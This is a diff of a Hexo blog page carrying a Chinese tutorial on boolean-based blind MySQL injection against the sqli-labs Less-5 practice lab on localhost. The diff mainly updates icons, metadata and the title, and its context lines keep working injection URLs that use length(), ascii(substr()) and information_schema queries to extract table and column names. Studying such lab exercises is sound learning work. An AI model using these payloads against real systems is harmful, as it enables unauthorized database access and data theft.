@@ -10,10 +10,10 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 3.9.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/zerotwo/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/zerotwo/images/标签图.jpg?v=7.4.0">
   <link rel="icon" type="image/png" sizes="32x32" href="/zerotwo/images/标签图.jpg?v=7.4.0">
   <link rel="icon" type="image/png" sizes="16x16" href="/zerotwo/images/标签图.jpg?v=7.4.0">
-  <link rel="mask-icon" href="/zerotwo/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="mask-icon" href="/zerotwo/images/标签图.jpg?v=7.4.0" color="#222">
 
 <link rel="stylesheet" href="/zerotwo/css/main.css?v=7.4.0">
 
@@ -55,18 +55,18 @@
   };
 </script>
 
-  <meta name="description" content="title: Mysql注入date: 2019-09-28 22:42:38 tags:Mysql注入-1MySQL数据库的特有的表是 information_schema.tables table_schema: 记录数据库名； table_name: 记录数据表名； table_rows: 关于表的粗略行估计； data_length : 记录表的大小（单位字节）； 1：判断当前数据库的长">
+  <meta name="description" content="1：判断当前数据库的长度利用二分法http://127.0.0.1/sqli/Less-5/?id=1&amp;#39; and length(database())&amp;gt;5 //正常显示 http://127.0.0.1/sqli/Less-5/?id=1&amp;#39; and length(database())&amp;gt;10 //不显示任何数据 http://127.0.0.1/sqli/Less-5/">
 <meta property="og:type" content="article">
-<meta property="og:title" content="卡面来打的学习记录">
-<meta property="og:url" content="https://kamian555.github.io/zerotwo/2019/09/28/Mysql注入/index.html">
+<meta property="og:title" content="MySQL注入">
+<meta property="og:url" content="https://kamian555.github.io/zerotwo/2019/09/29/MySQL注入/index.html">
 <meta property="og:site_name" content="卡面来打的学习记录">
-<meta property="og:description" content="title: Mysql注入date: 2019-09-28 22:42:38 tags:Mysql注入-1MySQL数据库的特有的表是 information_schema.tables table_schema: 记录数据库名； table_name: 记录数据表名； table_rows: 关于表的粗略行估计； data_length : 记录表的大小（单位字节）； 1：判断当前数据库的长">
+<meta property="og:description" content="1：判断当前数据库的长度利用二分法http://127.0.0.1/sqli/Less-5/?id=1&amp;#39; and length(database())&amp;gt;5 //正常显示 http://127.0.0.1/sqli/Less-5/?id=1&amp;#39; and length(database())&amp;gt;10 //不显示任何数据 http://127.0.0.1/sqli/Less-5/">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-09-28T14:46:19.112Z">
+<meta property="og:updated_time" content="2019-09-28T14:56:42.669Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="卡面来打的学习记录">
-<meta name="twitter:description" content="title: Mysql注入date: 2019-09-28 22:42:38 tags:Mysql注入-1MySQL数据库的特有的表是 information_schema.tables table_schema: 记录数据库名； table_name: 记录数据表名； table_rows: 关于表的粗略行估计； data_length : 记录表的大小（单位字节）； 1：判断当前数据库的长">
-  <link rel="canonical" href="https://kamian555.github.io/zerotwo/2019/09/28/Mysql注入/">
+<meta name="twitter:title" content="MySQL注入">
+<meta name="twitter:description" content="1：判断当前数据库的长度利用二分法http://127.0.0.1/sqli/Less-5/?id=1&amp;#39; and length(database())&amp;gt;5 //正常显示 http://127.0.0.1/sqli/Less-5/?id=1&amp;#39; and length(database())&amp;gt;10 //不显示任何数据 http://127.0.0.1/sqli/Less-5/">
+  <link rel="canonical" href="https://kamian555.github.io/zerotwo/2019/09/29/MySQL注入/">
 
 
 <script id="page-configurations">
@@ -80,7 +80,7 @@
   };
 </script>
 
-  <title> | 卡面来打的学习记录</title>
+  <title>MySQL注入 | 卡面来打的学习记录</title>
   
 
 
@@ -225,7 +225,7 @@
   
   
   <div class="post-block post">
-    <link itemprop="mainEntityOfPage" href="https://kamian555.github.io/zerotwo/zerotwo/2019/09/28/Mysql注入/">
+    <link itemprop="mainEntityOfPage" href="https://kamian555.github.io/zerotwo/zerotwo/2019/09/29/MySQL注入/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="">
@@ -237,7 +237,7 @@
       <meta itemprop="name" content="卡面来打的学习记录">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
+        <h1 class="post-title" itemprop="name headline">MySQL注入
 
           
         </h1>
@@ -253,7 +253,7 @@
                 
               
 
-              <time title="Created: 2019-09-28 10:42:38 / Modified: 10:46:19" itemprop="dateCreated datePublished" datetime="2019-09-28T10:42:38-04:00">2019-09-28</time>
+              <time title="Created: 2019-09-28 22:55:02 / Modified: 10:56:42" itemprop="dateCreated datePublished" datetime="2019-09-28T22:55:02-04:00">2019-09-28</time>
             </span>
           
             
@@ -272,14 +272,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <hr>
-<p>title: Mysql注入<br>date: 2019-09-28 22:42:38</p>
-<h2 id="tags-Mysql注入-1"><a href="#tags-Mysql注入-1" class="headerlink" title="tags:Mysql注入-1"></a>tags:Mysql注入-1</h2><p>MySQL数据库的特有的表是 information_schema.tables</p>
-<p>table_schema: 记录数据库名；</p>
-<p>table_name: 记录数据表名；</p>
-<p>table_rows: 关于表的粗略行估计；</p>
-<p>data_length : 记录表的大小（单位字节）；</p>
-<h2 id="1：判断当前数据库的长度"><a href="#1：判断当前数据库的长度" class="headerlink" title="1：判断当前数据库的长度"></a>1：判断当前数据库的长度</h2><p>利用二分法<code>http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;5 //正常显示</code></p>
+        <h2 id="1：判断当前数据库的长度"><a href="#1：判断当前数据库的长度" class="headerlink" title="1：判断当前数据库的长度"></a>1：判断当前数据库的长度</h2><p>利用二分法<code>http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;5 //正常显示</code></p>
 <p><code>http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;10 //不显示任何数据</code></p>
 <p><code>http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;7 //正常显示</code></p>
 <p><code>http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;8 //不显示任何数据 大于7</code>正常显示，大于8不显示，说明大于7而不大于8，</p>
@@ -297,7 +290,7 @@
 <p>判断第一个表的第二个字符的ascii值</p>
 <p><code>http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select table\_name from information\_schema.tables where table_schema=database() limit 0,1),2,1))&gt;100 #</code></p>
 <p>………由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断</p>
-<h2 id="4-判断表中的字段"><a href="#4-判断表中的字段" class="headerlink" title="4. 判断表中的字段"></a>4. 判断表中的字段</h2><p><code>http://127.0.0.1/sqli/Less-5/?id=1&#39; and exists(select username from admin)</code>//如果已经证实了存在admin表，那么猜测是否存在username字段</p>
+<h2 id="4-判断表中的字段"><a href="#4-判断表中的字段" class="headerlink" title="4. 判断表中的字段"></a>4. 判断表中的字段</h2><p><code>http://127.0.0.1/sqli/Less-5/?id=1&#39; and exists(select username from admin)</code> //如果已经证实了存在admin表，那么猜测是否存在username字段</p>
 <h3 id="1：判断表中字段的个数-判断users表中字段个数是否大于5，这里的users表是通过上面的语句爆出来的"><a href="#1：判断表中字段的个数-判断users表中字段个数是否大于5，这里的users表是通过上面的语句爆出来的" class="headerlink" title="1：判断表中字段的个数//判断users表中字段个数是否大于5，这里的users表是通过上面的语句爆出来的"></a>1：判断表中字段的个数//判断users表中字段个数是否大于5，这里的users表是通过上面的语句爆出来的</h3><p><code>http://127.0.0.1/sqli/Less-5/?id=1&#39; and (select count(column\_name) from information\_schema.columns where table_name=&#39;users&#39;)&gt;5 #</code></p>
 <h3 id="2：判断字段的长度-判断第一个字段的长度"><a href="#2：判断字段的长度-判断第一个字段的长度" class="headerlink" title="2：判断字段的长度//判断第一个字段的长度"></a>2：判断字段的长度//判断第一个字段的长度</h3><p><code>http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select column\_name from information\_schema.columns where table_name=&#39;users&#39; limit 0,1))&gt;5</code></p>
 <p>//判断第二个字段的长度</p>
@@ -386,7 +379,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#tags-Mysql注入-1"><span class="nav-number">1.</span> <span class="nav-text">tags:Mysql注入-1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1：判断当前数据库的长度"><span class="nav-number">2.</span> <span class="nav-text">1：判断当前数据库的长度</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2：判断当前数据库的字符"><span class="nav-number">3.</span> <span class="nav-text">2：判断当前数据库的字符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3：判断当前数据库中的表"><span class="nav-number">4.</span> <span class="nav-text">3：判断当前数据库中的表</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1：判断当前数据库中表的个数-判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4"><span class="nav-number">4.1.</span> <span class="nav-text">1：判断当前数据库中表的个数// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2：判断每个表的长度-判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6"><span class="nav-number">4.2.</span> <span class="nav-text">2：判断每个表的长度//判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3：判断每个表的每个字符的ascii值"><span class="nav-number">5.</span> <span class="nav-text">3：判断每个表的每个字符的ascii值</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-判断表中的字段"><span class="nav-number">6.</span> <span class="nav-text">4. 判断表中的字段</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1：判断表中字段的个数-判断users表中字段个数是否大于5，这里的users表是通过上面的语句爆出来的"><span class="nav-number">6.1.</span> <span class="nav-text">1：判断表中字段的个数//判断users表中字段个数是否大于5，这里的users表是通过上面的语句爆出来的</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2：判断字段的长度-判断第一个字段的长度"><span class="nav-number">6.2.</span> <span class="nav-text">2：判断字段的长度//判断第一个字段的长度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3：判断字段的ascii值-判断第一个字段的第一个字符的长度"><span class="nav-number">6.3.</span> <span class="nav-text">3：判断字段的ascii值//判断第一个字段的第一个字符的长度</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-判断字段中的数据"><span class="nav-number">7.</span> <span class="nav-text">5.判断字段中的数据</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-判断数据的长度-判断id字段的第一个数据的长度"><span class="nav-number">7.1.</span> <span class="nav-text">1: 判断数据的长度// 判断id字段的第一个数据的长度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2：判断数据的ascii值-判断id字段的第一个数据的第一个字符的ascii值"><span class="nav-number">7.2.</span> <span class="nav-text">2：判断数据的ascii值// 判断id字段的第一个数据的第一个字符的ascii值</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1：判断当前数据库的长度"><span class="nav-number">1.</span> <span class="nav-text">1：判断当前数据库的长度</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2：判断当前数据库的字符"><span class="nav-number">2.</span> <span class="nav-text">2：判断当前数据库的字符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3：判断当前数据库中的表"><span class="nav-number">3.</span> <span class="nav-text">3：判断当前数据库中的表</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1：判断当前数据库中表的个数-判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4"><span class="nav-number">3.1.</span> <span class="nav-text">1：判断当前数据库中表的个数// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2：判断每个表的长度-判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6"><span class="nav-number">3.2.</span> <span class="nav-text">2：判断每个表的长度//判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3：判断每个表的每个字符的ascii值"><span class="nav-number">4.</span> <span class="nav-text">3：判断每个表的每个字符的ascii值</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-判断表中的字段"><span class="nav-number">5.</span> <span class="nav-text">4. 判断表中的字段</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1：判断表中字段的个数-判断users表中字段个数是否大于5，这里的users表是通过上面的语句爆出来的"><span class="nav-number">5.1.</span> <span class="nav-text">1：判断表中字段的个数//判断users表中字段个数是否大于5，这里的users表是通过上面的语句爆出来的</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2：判断字段的长度-判断第一个字段的长度"><span class="nav-number">5.2.</span> <span class="nav-text">2：判断字段的长度//判断第一个字段的长度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3：判断字段的ascii值-判断第一个字段的第一个字符的长度"><span class="nav-number">5.3.</span> <span class="nav-text">3：判断字段的ascii值//判断第一个字段的第一个字符的长度</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-判断字段中的数据"><span class="nav-number">6.</span> <span class="nav-text">5.判断字段中的数据</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-判断数据的长度-判断id字段的第一个数据的长度"><span class="nav-number">6.1.</span> <span class="nav-text">1: 判断数据的长度// 判断id字段的第一个数据的长度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2：判断数据的ascii值-判断id字段的第一个数据的第一个字符的ascii值"><span class="nav-number">6.2.</span> <span class="nav-text">2：判断数据的ascii值// 判断id字段的第一个数据的第一个字符的ascii值</span></a></li></ol></li></ol></div>
         
       </div>
       <!--/noindex-->
